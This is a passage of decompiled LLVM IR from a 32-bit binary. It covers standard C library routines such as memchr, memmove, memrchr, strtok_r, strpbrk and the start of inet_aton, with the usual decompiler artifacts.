  %v2_8052b25 = load i8, i8* %v1_8052b25, align 1
  %v3_8052b25 = zext i8 %v2_8052b25 to i32
  store i32 %v3_8052b25, i32* @edx, align 4
  %v1_8052b28 = add i32 %v0_8052b25, 1
  %v2_8052b29 = add i32 %v1_8052b29, 16
  %v3_8052b29 = inttoptr i32 %v2_8052b29 to i32*
  store i32 %v1_8052b28, i32* %v3_8052b29, align 4
  %v0_8052b50.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052b4d

dec_label_pc_8052b2e:                             ; preds = %dec_label_pc_8052b01
  %v2_8052b31 = ptrtoint i8* %stack_var_-5 to i32
  %v5_8052b36 = inttoptr i32 %v0_8052b36 to i16*
  %v5_8052b37 = call i32 @__stdio_READ(i16* %v5_8052b36, i32 %v2_8052b31, i32 1)
  %v1_8052b3f = icmp eq i32 %v5_8052b37, 0
  br i1 %v1_8052b3f, label %dec_label_pc_8052b4a, label %dec_label_pc_8052b43

dec_label_pc_8052b43:                             ; preds = %dec_label_pc_8052b2e
  %v3_8052b43 = load i8, i8* %stack_var_-5, align 1
  %v4_8052b43 = sext i8 %v3_8052b43 to i32
  store i32 %v4_8052b43, i32* @edx, align 4
  br label %dec_label_pc_8052b4d

dec_label_pc_8052b4a:                             ; preds = %dec_label_pc_8052b2e, %dec_label_pc_8052b09, %dec_label_pc_8052a9b, %dec_label_pc_8052ae4
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8052b4d

dec_label_pc_8052b4d:                             ; preds = %dec_label_pc_8052b43, %dec_label_pc_8052b25, %dec_label_pc_8052abb, %dec_label_pc_8052b4a
  %v0_8052b50 = phi i32 [ %v4_8052b43, %dec_label_pc_8052b43 ], [ %v0_8052b50.pre, %dec_label_pc_8052b25 ], [ %v1_8052ad1, %dec_label_pc_8052abb ], [ -1, %dec_label_pc_8052b4a ]
  store i32 %v0_8052a78, i32* @ebx, align 4
  ret i32 %v0_8052b50

; uselistorder directives
  uselistorder i32 %v0_8052b25, { 1, 0 }
  uselistorder i32 %v3_8052b01, { 1, 0 }
  uselistorder i32 %v0_8052b36, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8052ad6, { 1, 0, 2 }
  uselistorder i32 %v1_8052ad1, { 1, 0 }
  uselistorder i16 %v2_8052ab3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8052ae7, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* @global_var_8058280.144, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8052b4d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052b4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052b25, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052b01, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b54 = load i32, i32* @edi, align 4
  store i32 %v0_8052b54, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8052b5b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052b5b, i32* %edi.global-to-local, align 4
  %v1_8052b63 = icmp eq i32 %arg3, 0
  store i1 %v1_8052b63, i1* %zf.global-to-local, align 1
  br i1 %v1_8052b63, label %dec_label_pc_8052b73, label %dec_label_pc_8052b67

dec_label_pc_8052b67:                             ; preds = %entry
  %v2_8052b67 = call i32 @_strlen(i8* %arg1)
  %v3_8052b67 = mul i32 %v2_8052b67, -1
  %v4_8052b67 = add i32 %v3_8052b67, -2
  store i32 %v4_8052b67, i32* @ecx, align 4
  %v0_8052b69 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8052b69, label %dec_label_pc_8052b67.dec_label_pc_8052b70_crit_edge, label %dec_label_pc_8052b6b

dec_label_pc_8052b67.dec_label_pc_8052b70_crit_edge: ; preds = %dec_label_pc_8052b67
  %v0_8052b70.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8052b70.pre, -1
  br label %dec_label_pc_8052b70

dec_label_pc_8052b6b:                             ; preds = %dec_label_pc_8052b67
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052b70

dec_label_pc_8052b70:                             ; preds = %dec_label_pc_8052b67.dec_label_pc_8052b70_crit_edge, %dec_label_pc_8052b6b
  %v0_8052b70 = phi i32 [ %phitmp, %dec_label_pc_8052b67.dec_label_pc_8052b70_crit_edge ], [ 0, %dec_label_pc_8052b6b ]
  %v8_8052b70 = icmp eq i32 %v0_8052b70, 0
  store i1 %v8_8052b70, i1* %zf.global-to-local, align 1
  store i32 %v0_8052b70, i32* %edi.global-to-local, align 4
  %v2_8052b73.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052b73

dec_label_pc_8052b73:                             ; preds = %entry, %dec_label_pc_8052b70
  %v0_8052b74 = phi i32 [ 0, %entry ], [ %v0_8052b70, %dec_label_pc_8052b70 ]
  %v2_8052b73 = phi i32 [ %v0_8052b54, %entry ], [ %v2_8052b73.pre, %dec_label_pc_8052b70 ]
  store i32 %v2_8052b73, i32* @edi, align 4
  ret i32 %v0_8052b74

; uselistorder directives
  uselistorder i32 %v0_8052b70, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8052b73, { 1, 0 }
  uselistorder label %dec_label_pc_8052b70, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8052b79 = load i32, i32* @esi, align 4
  store i32 %v0_8052b79, i32* %stack_var_-8, align 4
  %v4_8052b7a = ptrtoint i8* %arg1 to i32
  %v9_8052b86 = icmp ugt i8* %tmp3, %arg1
  %v1_8052b88 = icmp eq i1 %v9_8052b86, false
  br i1 %v1_8052b88, label %dec_label_pc_8052b90, label %dec_label_pc_8052b8a

dec_label_pc_8052b8a:                             ; preds = %entry
  %v7_8052b8c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8052b9c

dec_label_pc_8052b90:                             ; preds = %entry
  %v3_8052b90 = add i32 %arg2, -1
  %v4_8052b90 = add i32 %v3_8052b90, %tmp
  %v5_8052b90 = inttoptr i32 %v4_8052b90 to i8*
  %v3_8052b94 = add i32 %v4_8052b7a, -1
  %v4_8052b94 = add i32 %v3_8052b94, %tmp
  %v5_8052b94 = inttoptr i32 %v4_8052b94 to i8*
  %v7_8052b99 = call i8* @_memcpy(i8* %v5_8052b94, i8* %v5_8052b90, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8052b9c

dec_label_pc_8052b9c:                             ; preds = %dec_label_pc_8052b8a, %dec_label_pc_8052b90
  %v2_8052b9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052b9c, i32* @esi, align 4
  ret i32 %v4_8052b7a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052b9c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052ba0 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8052bb3 = inttoptr i32 %arg1 to i16*
  %v4_8052bb3 = call i32 @memcpy(i16* %v3_8052bb3, i32 %arg2, i32 %arg3)
  %v0_8052bbb = load i32, i32* @esi, align 4
  %v2_8052bbb = add i32 %v0_8052bbb, %arg3
  store i32 %v0_8052ba0, i32* @esi, align 4
  ret i32 %v2_8052bbb
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8052bc9 = urem i32 %arg2, 256
  %v4_8052bd5 = sext i8 %arg1 to i32
  %v2_8052bd9 = add i32 %v4_8052bd5, %arg3
  %v1_8052beb7 = icmp eq i32 %arg3, 0
  br i1 %v1_8052beb7, label %dec_label_pc_8052bf3, label %dec_label_pc_8052bef

dec_label_pc_8052bdd:                             ; preds = %dec_label_pc_8052bef
  %v1_8052bdd = add i32 %v0_8052bdd, -1
  %v5_8052bde = load i32, i32* @edx, align 4
  %v6_8052bde = and i32 %v5_8052bde, -256
  %v7_8052bde = or i32 %v6_8052bde, %v4_8052bc9
  store i32 %v7_8052bde, i32* @edx, align 4
  %v1_8052be2 = inttoptr i32 %v1_8052bdd to i8*
  %v2_8052be2 = load i8, i8* %v1_8052be2, align 1
  %v15_8052be2 = icmp eq i8 %v2_8052be2, %tmp
  br i1 %v15_8052be2, label %dec_label_pc_8052c70, label %dec_label_pc_8052bea

dec_label_pc_8052bea:                             ; preds = %dec_label_pc_8052bdd
  %v1_8052bea = add i32 %v0_8052bea, -1
  %v8_8052bea = icmp eq i32 %v1_8052bea, 0
  br i1 %v8_8052bea, label %dec_label_pc_8052bf3, label %dec_label_pc_8052bef

dec_label_pc_8052bef:                             ; preds = %entry, %dec_label_pc_8052bea
  %v0_8052bea = phi i32 [ %v1_8052bea, %dec_label_pc_8052bea ], [ %arg3, %entry ]
  %v0_8052bdd = phi i32 [ %v1_8052bdd, %dec_label_pc_8052bea ], [ %v2_8052bd9, %entry ]
  %v2_8052bef = urem i32 %v0_8052bdd, 4
  %v3_8052bef = icmp eq i32 %v2_8052bef, 0
  %v1_8052bf1 = icmp eq i1 %v3_8052bef, false
  br i1 %v1_8052bf1, label %dec_label_pc_8052bdd, label %dec_label_pc_8052bf3

dec_label_pc_8052bf3:                             ; preds = %dec_label_pc_8052bea, %dec_label_pc_8052bef, %entry
  %v0_8052c56.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8052bea ], [ %v0_8052bea, %dec_label_pc_8052bef ]
  %v0_8052bf8 = phi i32 [ %v2_8052bd9, %entry ], [ %v1_8052bdd, %dec_label_pc_8052bea ], [ %v0_8052bdd, %dec_label_pc_8052bef ]
  store i32 %v0_8052bf8, i32* @ecx, align 4
  %v2_8052bfc = mul nuw nsw i32 %v4_8052bc9, 256
  %v2_8052bff = or i32 %v2_8052bfc, %v4_8052bc9
  %v2_8052c03 = mul i32 %v2_8052bff, 65536
  %v2_8052c06 = or i32 %v2_8052c03, %v2_8052bff
  %v6_8052c5955 = icmp ugt i32 %v0_8052c56.pr, 3
  br i1 %v6_8052c5955, label %dec_label_pc_8052c0a, label %dec_label_pc_8052c5b

dec_label_pc_8052c0a:                             ; preds = %dec_label_pc_8052bf3, %dec_label_pc_8052c53
  %v0_8052c5357 = phi i32 [ %v1_8052c53, %dec_label_pc_8052c53 ], [ %v0_8052c56.pr, %dec_label_pc_8052bf3 ]
  %v0_8052c0a56 = phi i32 [ %v1_8052c0a, %dec_label_pc_8052c53 ], [ %v0_8052bf8, %dec_label_pc_8052bf3 ]
  %v1_8052c0a = add i32 %v0_8052c0a56, -4
  store i32 %v1_8052c0a, i32* @ecx, align 4
  %v2_8052c0f = inttoptr i32 %v1_8052c0a to i32*
  %v3_8052c0f = load i32, i32* %v2_8052c0f, align 4
  %v4_8052c0f = xor i32 %v3_8052c0f, %v2_8052c06
  %v1_8052c11 = add i32 %v4_8052c0f, 2130640639
  %v1_8052c17 = sub i32 -1, %v4_8052c0f
  %v2_8052c19 = xor i32 %v1_8052c11, %v1_8052c17
  %v1_8052c1b = and i32 %v2_8052c19, -2130640640
  %v2_8052c1b = icmp eq i32 %v1_8052c1b, 0
  br i1 %v2_8052c1b, label %dec_label_pc_8052c53, label %dec_label_pc_8052c23

dec_label_pc_8052c23:                             ; preds = %dec_label_pc_8052c0a
  %v7_8052c23 = or i32 %v1_8052c1b, %v4_8052bc9
  %v1_8052c27 = add i32 %v0_8052c0a56, -1
  %v2_8052c2a = inttoptr i32 %v1_8052c27 to i8*
  %v3_8052c2a = load i8, i8* %v2_8052c2a, align 1
  %v16_8052c2a = icmp eq i8 %v3_8052c2a, %tmp
  br i1 %v16_8052c2a, label %dec_label_pc_8052c70, label %dec_label_pc_8052c2f

dec_label_pc_8052c2f:                             ; preds = %dec_label_pc_8052c23
  %v1_8052c33 = add i32 %v0_8052c0a56, -2
  %v2_8052c36 = inttoptr i32 %v1_8052c33 to i8*
  %v3_8052c36 = load i8, i8* %v2_8052c36, align 1
  %v16_8052c36 = icmp eq i8 %v3_8052c36, %tmp
  br i1 %v16_8052c36, label %dec_label_pc_8052c70, label %dec_label_pc_8052c3b

dec_label_pc_8052c3b:                             ; preds = %dec_label_pc_8052c2f
  %v1_8052c3f = add i32 %v0_8052c0a56, -3
  %v2_8052c42 = inttoptr i32 %v1_8052c3f to i8*
  %v3_8052c42 = load i8, i8* %v2_8052c42, align 1
  %v16_8052c42 = icmp eq i8 %v3_8052c42, %tmp
  br i1 %v16_8052c42, label %dec_label_pc_8052c70, label %dec_label_pc_8052c47

dec_label_pc_8052c47:                             ; preds = %dec_label_pc_8052c3b
  %v1_8052c4b = inttoptr i32 %v1_8052c0a to i8*
  %v2_8052c4b = load i8, i8* %v1_8052c4b, align 1
  %v15_8052c4b = icmp eq i8 %v2_8052c4b, %tmp
  %v1_8052c4d = icmp eq i1 %v15_8052c4b, false
  br i1 %v1_8052c4d, label %dec_label_pc_8052c53, label %dec_label_pc_8052c4f

dec_label_pc_8052c4f:                             ; preds = %dec_label_pc_8052c47
  br label %dec_label_pc_8052c70

dec_label_pc_8052c53:                             ; preds = %dec_label_pc_8052c47, %dec_label_pc_8052c0a
  %v5_8052c6027 = phi i32 [ %v7_8052c23, %dec_label_pc_8052c47 ], [ 0, %dec_label_pc_8052c0a ]
  %v1_8052c53 = add i32 %v0_8052c5357, -4
  %v6_8052c59 = icmp ugt i32 %v1_8052c53, 3
  br i1 %v6_8052c59, label %dec_label_pc_8052c0a, label %dec_label_pc_8052c5b

dec_label_pc_8052c5b:                             ; preds = %dec_label_pc_8052c53, %dec_label_pc_8052bf3
  %v5_8052c6026.lcssa = phi i32 [ %v4_8052bc9, %dec_label_pc_8052bf3 ], [ %v5_8052c6027, %dec_label_pc_8052c53 ]
  %v0_8052c0a.lcssa = phi i32 [ %v0_8052bf8, %dec_label_pc_8052bf3 ], [ %v1_8052c0a, %dec_label_pc_8052c53 ]
  %v0_8052c53.lcssa = phi i32 [ %v0_8052c56.pr, %dec_label_pc_8052bf3 ], [ %v1_8052c53, %dec_label_pc_8052c53 ]
  br label %dec_label_pc_8052c68

dec_label_pc_8052c5f:                             ; preds = %dec_label_pc_8052c68
  %v1_8052c68 = add i32 %v0_8052c68, -1
  %v1_8052c5f = add i32 %v0_8052c5f, -1
  %v6_8052c60 = and i32 %v5_8052c60, -256
  %v7_8052c60 = or i32 %v6_8052c60, %v4_8052bc9
  %v1_8052c64 = inttoptr i32 %v1_8052c5f to i8*
  %v2_8052c64 = load i8, i8* %v1_8052c64, align 1
  %v15_8052c64 = icmp eq i8 %v2_8052c64, %tmp
  br i1 %v15_8052c64, label %dec_label_pc_8052c70, label %dec_label_pc_8052c68

dec_label_pc_8052c68:                             ; preds = %dec_label_pc_8052c5f, %dec_label_pc_8052c5b
  %v5_8052c60 = phi i32 [ %v7_8052c60, %dec_label_pc_8052c5f ], [ %v5_8052c6026.lcssa, %dec_label_pc_8052c5b ]
  %v0_8052c5f = phi i32 [ %v1_8052c5f, %dec_label_pc_8052c5f ], [ %v0_8052c0a.lcssa, %dec_label_pc_8052c5b ]
  %v0_8052c68 = phi i32 [ %v1_8052c68, %dec_label_pc_8052c5f ], [ %v0_8052c53.lcssa, %dec_label_pc_8052c5b ]
  %v10_8052c69 = icmp eq i32 %v0_8052c68, 0
  %v1_8052c6c = icmp eq i1 %v10_8052c69, false
  br i1 %v1_8052c6c, label %dec_label_pc_8052c5f, label %dec_label_pc_8052c6e

dec_label_pc_8052c6e:                             ; preds = %dec_label_pc_8052c68
  br label %dec_label_pc_8052c70

dec_label_pc_8052c70:                             ; preds = %dec_label_pc_8052bdd, %dec_label_pc_8052c3b, %dec_label_pc_8052c2f, %dec_label_pc_8052c23, %dec_label_pc_8052c5f, %dec_label_pc_8052c4f, %dec_label_pc_8052c6e
  %v0_8052c73 = phi i32 [ %v1_8052c0a, %dec_label_pc_8052c4f ], [ 0, %dec_label_pc_8052c6e ], [ %v1_8052c5f, %dec_label_pc_8052c5f ], [ %v1_8052c3f, %dec_label_pc_8052c3b ], [ %v1_8052c33, %dec_label_pc_8052c2f ], [ %v1_8052c27, %dec_label_pc_8052c23 ], [ %v1_8052bdd, %dec_label_pc_8052bdd ]
  ret i32 %v0_8052c73

; uselistorder directives
  uselistorder i32 %v0_8052c68, { 1, 0 }
  uselistorder i32 %v1_8052c53, { 0, 2, 1 }
  uselistorder i32 %v1_8052c0a, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8052c0a56, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8052bff, { 1, 0 }
  uselistorder i32 %v0_8052bdd, { 1, 0, 2 }
  uselistorder i32 %v2_8052bd9, { 1, 0 }
  uselistorder i32 %v4_8052bc9, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 6, 0, 15, 16, 1, 14, 18, 13, 19, 3, 5, 4, 20, 7, 8, 9, 17, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c70, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052c0a, { 1, 0 }
  uselistorder label %dec_label_pc_8052bf3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052bef, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052c74 = load i32, i32* @edi, align 4
  %v0_8052c75 = load i32, i32* @esi, align 4
  %v0_8052c76 = load i32, i32* @ebx, align 4
  store i32 %v0_8052c76, i32* %stack_var_-12, align 4
  %v4_8052c77 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052c77, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8052c83 = icmp eq i8* %arg1, null
  %v1_8052c85 = icmp eq i1 %v1_8052c83, false
  br i1 %v1_8052c85, label %dec_label_pc_8052c89, label %dec_label_pc_8052c87

dec_label_pc_8052c87:                             ; preds = %entry
  %v1_8052c87 = inttoptr i32 %arg3 to i32*
  %v2_8052c87 = load i32, i32* %v1_8052c87, align 4
  store i32 %v2_8052c87, i32* @ebx, align 4
  br label %dec_label_pc_8052c89

dec_label_pc_8052c89:                             ; preds = %entry, %dec_label_pc_8052c87
  %v0_8052c8c = phi i32 [ %v4_8052c77, %entry ], [ %v2_8052c87, %dec_label_pc_8052c87 ]
  %v0_8052c89 = load i32, i32* @ecx, align 4
  %v5_8052c8c = inttoptr i32 %v0_8052c8c to i8*
  %v8_8052c8d = call i32 @__GI_strspn(i8* %v5_8052c8c, i32 %arg2, i32 %v0_8052c89, i32 %v0_8052c89)
  store i32 %v8_8052c8d, i32* %eax.global-to-local, align 4
  %v0_8052c95 = load i32, i32* @ebx, align 4
  %v2_8052c95 = add i32 %v0_8052c95, %v8_8052c8d
  store i32 %v2_8052c95, i32* @ebx, align 4
  %v1_8052c97 = inttoptr i32 %v2_8052c95 to i8*
  %v2_8052c97 = load i8, i8* %v1_8052c97, align 1
  %v3_8052c97 = icmp eq i8 %v2_8052c97, 0
  %v1_8052c9a = icmp eq i1 %v3_8052c97, false
  br i1 %v1_8052c9a, label %dec_label_pc_8052ca2, label %dec_label_pc_8052c9c

dec_label_pc_8052c9c:                             ; preds = %dec_label_pc_8052c89
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052c9e = load i32, i32* @esi, align 4
  %v2_8052c9e = inttoptr i32 %v1_8052c9e to i32*
  store i32 %v2_8052c95, i32* %v2_8052c9e, align 4
  %v0_8052ccc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052cc9

dec_label_pc_8052ca2:                             ; preds = %dec_label_pc_8052c89
  %v0_8052ca2 = load i32, i32* @edx, align 4
  %v0_8052ca4 = load i32, i32* @edi, align 4
  %v8_8052ca6 = call i32 @__GI_strpbrk(i8* %v1_8052c97, i32 %v0_8052ca4, i32 %v0_8052ca2, i32 %v0_8052ca2)
  store i32 %v8_8052ca6, i32* %eax.global-to-local, align 4
  %v2_8052cae = icmp eq i32 %v8_8052ca6, 0
  %v1_8052cb0 = icmp eq i1 %v2_8052cae, false
  br i1 %v1_8052cb0, label %dec_label_pc_8052cc1, label %dec_label_pc_8052cb2

dec_label_pc_8052cb2:                             ; preds = %dec_label_pc_8052ca2
  %v0_8052cb6 = load i32, i32* @ebx, align 4
  %v5_8052cb6 = inttoptr i32 %v0_8052cb6 to i8*
  %v8_8052cb7 = call i32 @rawmemchr(i8* %v5_8052cb6, i32 0, i32 %v8_8052ca6, i32 %v8_8052ca6)
  br label %dec_label_pc_8052cc5

dec_label_pc_8052cc1:                             ; preds = %dec_label_pc_8052ca2
  %v9_8052ca6 = inttoptr i32 %v8_8052ca6 to i8*
  store i8 0, i8* %v9_8052ca6, align 1
  %v2_8052cc4 = add i32 %v8_8052ca6, 1
  br label %dec_label_pc_8052cc5

dec_label_pc_8052cc5:                             ; preds = %dec_label_pc_8052cb2, %dec_label_pc_8052cc1
  %storemerge = phi i32 [ %v2_8052cc4, %dec_label_pc_8052cc1 ], [ %v8_8052cb7, %dec_label_pc_8052cb2 ]
  %v0_8052cc5 = phi i32 [ %v2_8052cc4, %dec_label_pc_8052cc1 ], [ %v8_8052cb7, %dec_label_pc_8052cb2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8052cc5 = load i32, i32* @esi, align 4
  %v2_8052cc5 = inttoptr i32 %v1_8052cc5 to i32*
  store i32 %v0_8052cc5, i32* %v2_8052cc5, align 4
  %v0_8052cc7 = load i32, i32* @ebx, align 4
  store i32 %v0_8052cc7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052cc9

dec_label_pc_8052cc9:                             ; preds = %dec_label_pc_8052c9c, %dec_label_pc_8052cc5
  %v0_8052ccc = phi i32 [ %v0_8052ccc.pre, %dec_label_pc_8052c9c ], [ %v0_8052cc7, %dec_label_pc_8052cc5 ]
  %v2_8052cc9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052cc9, i32* @ebx, align 4
  store i32 %v0_8052c75, i32* @esi, align 4
  store i32 %v0_8052c74, i32* @edi, align 4
  ret i32 %v0_8052ccc

; uselistorder directives
  uselistorder i32 %v8_8052ca6, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052cc9, { 1, 0 }
  uselistorder label %dec_label_pc_8052cc5, { 1, 0 }
  uselistorder label %dec_label_pc_8052c89, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052cd1 = load i32, i32* @ebx, align 4
  %v2_8052ce825 = load i8, i8* %arg1, align 1
  %v4_8052cea29 = icmp eq i8 %v2_8052ce825, 0
  br i1 %v4_8052cea29, label %dec_label_pc_8052cf2, label %dec_label_pc_8052cee.lr.ph

dec_label_pc_8052cee.lr.ph:                       ; preds = %entry
  %v3_8052ce826 = zext i8 %v2_8052ce825 to i32
  %v5_8052ce827 = and i32 %v0_8052cd1, -256
  %v6_8052ce828 = or i32 %v3_8052ce826, %v5_8052ce827
  %v4_8052cd6 = ptrtoint i8* %arg1 to i32
  %v1_8052ce113 = inttoptr i32 %arg2 to i8*
  %v4_8052ce1.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052cee

dec_label_pc_8052cdc:                             ; preds = %dec_label_pc_8052cee, %dec_label_pc_8052ce0
  %v6_8052ce123 = phi i32 [ %v6_8052ce1, %dec_label_pc_8052ce0 ], [ %v6_8052ce117, %dec_label_pc_8052cee ]
  %v2_8052ce122 = phi i8 [ %v2_8052ce1, %dec_label_pc_8052ce0 ], [ %v2_8052ce114, %dec_label_pc_8052cee ]
  %v0_8052ce021 = phi i32 [ %v1_8052ce0, %dec_label_pc_8052ce0 ], [ %arg2, %dec_label_pc_8052cee ]
  %v15_8052cdc = icmp eq i8 %v2_8052ce122, %v2_8052ce833
  br i1 %v15_8052cdc, label %dec_label_pc_8052cf4, label %dec_label_pc_8052ce0

dec_label_pc_8052ce0:                             ; preds = %dec_label_pc_8052cdc
  %v1_8052ce0 = add i32 %v0_8052ce021, 1
  store i32 %v1_8052ce0, i32* @edx, align 4
  %v1_8052ce1 = inttoptr i32 %v1_8052ce0 to i8*
  %v2_8052ce1 = load i8, i8* %v1_8052ce1, align 1
  %v3_8052ce1 = zext i8 %v2_8052ce1 to i32
  %v5_8052ce1 = and i32 %v6_8052ce123, -256
  %v6_8052ce1 = or i32 %v3_8052ce1, %v5_8052ce1
  store i32 %v6_8052ce1, i32* @ecx, align 4
  %v4_8052ce3 = icmp eq i8 %v2_8052ce1, 0
  %v1_8052ce5 = icmp eq i1 %v4_8052ce3, false
  br i1 %v1_8052ce5, label %dec_label_pc_8052cdc, label %dec_label_pc_8052ce7

dec_label_pc_8052ce7:                             ; preds = %dec_label_pc_8052ce0, %dec_label_pc_8052cee
  %v4_8052ce1.pre36 = phi i32 [ %v6_8052ce117, %dec_label_pc_8052cee ], [ %v6_8052ce1, %dec_label_pc_8052ce0 ]
  %v1_8052ce7 = add i32 %v0_8052ce731, 1
  %v1_8052ce8 = inttoptr i32 %v1_8052ce7 to i8*
  %v2_8052ce8 = load i8, i8* %v1_8052ce8, align 1
  %v3_8052ce8 = zext i8 %v2_8052ce8 to i32
  %v5_8052ce8 = and i32 %v6_8052ce834, -256
  %v6_8052ce8 = or i32 %v3_8052ce8, %v5_8052ce8
  %v4_8052cea = icmp eq i8 %v2_8052ce8, 0
  br i1 %v4_8052cea, label %dec_label_pc_8052cf2, label %dec_label_pc_8052cee

dec_label_pc_8052cee:                             ; preds = %dec_label_pc_8052cee.lr.ph, %dec_label_pc_8052ce7
  %v4_8052ce1.pre = phi i32 [ %v4_8052ce1.pre.pre, %dec_label_pc_8052cee.lr.ph ], [ %v4_8052ce1.pre36, %dec_label_pc_8052ce7 ]
  %v6_8052ce834 = phi i32 [ %v6_8052ce828, %dec_label_pc_8052cee.lr.ph ], [ %v6_8052ce8, %dec_label_pc_8052ce7 ]
  %v2_8052ce833 = phi i8 [ %v2_8052ce825, %dec_label_pc_8052cee.lr.ph ], [ %v2_8052ce8, %dec_label_pc_8052ce7 ]
  %v0_8052ce731 = phi i32 [ %v4_8052cd6, %dec_label_pc_8052cee.lr.ph ], [ %v1_8052ce7, %dec_label_pc_8052ce7 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8052ce114 = load i8, i8* %v1_8052ce113, align 1
  %v3_8052ce115 = zext i8 %v2_8052ce114 to i32
  %v5_8052ce116 = and i32 %v4_8052ce1.pre, -256
  %v6_8052ce117 = or i32 %v3_8052ce115, %v5_8052ce116
  store i32 %v6_8052ce117, i32* @ecx, align 4
  %v4_8052ce318 = icmp eq i8 %v2_8052ce114, 0
  %v1_8052ce520 = icmp eq i1 %v4_8052ce318, false
  br i1 %v1_8052ce520, label %dec_label_pc_8052cdc, label %dec_label_pc_8052ce7

dec_label_pc_8052cf2:                             ; preds = %dec_label_pc_8052ce7, %entry
  br label %dec_label_pc_8052cf4

dec_label_pc_8052cf4:                             ; preds = %dec_label_pc_8052cdc, %dec_label_pc_8052cf2
  %v0_8052cf6 = phi i32 [ 0, %dec_label_pc_8052cf2 ], [ %v0_8052ce731, %dec_label_pc_8052cdc ]
  store i32 %v0_8052cd1, i32* @ebx, align 4
  ret i32 %v0_8052cf6

; uselistorder directives
  uselistorder i32 %v6_8052ce117, { 2, 0, 1 }
  uselistorder i8 %v2_8052ce114, { 1, 2, 0 }
  uselistorder i32 %v1_8052ce7, { 1, 0 }
  uselistorder i32 %v6_8052ce1, { 1, 2, 0 }
  uselistorder i8 %v2_8052ce1, { 1, 2, 0 }
  uselistorder i32 %v1_8052ce0, { 2, 1, 0 }
  uselistorder i8 %v2_8052ce825, { 0, 2, 1 }
  uselistorder i32 %v0_8052cd1, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052cf4, { 1, 0 }
  uselistorder label %dec_label_pc_8052cee, { 1, 0 }
  uselistorder label %dec_label_pc_8052ce7, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8052cff = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052cff, i32* @ecx, align 4
  %v1_8052d03 = icmp eq i8* %arg1, null
  br i1 %v1_8052d03, label %dec_label_pc_8052d84, label %dec_label_pc_8052d07

dec_label_pc_8052d07:                             ; preds = %entry
  %v0_8052d12.pre = load i32, i32* @global_var_8058218, align 8
  br label %dec_label_pc_8052d12

